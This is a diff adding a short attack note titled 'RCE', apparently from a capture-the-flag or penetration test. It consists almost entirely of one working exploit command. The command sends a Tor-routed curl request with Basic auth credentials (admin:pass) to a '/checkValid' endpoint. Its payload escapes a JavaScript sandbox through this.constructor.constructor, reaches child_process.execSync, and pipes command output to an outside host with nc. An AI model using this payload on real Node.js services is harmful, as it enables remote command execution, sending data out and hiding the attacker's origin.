@@ -1,0 +1,5 @@
+RCE :
+
+torify curl 'http://ip:port/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw==' --data "document=this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('id | nc ip port')"
+
+basic auth - admin:pass
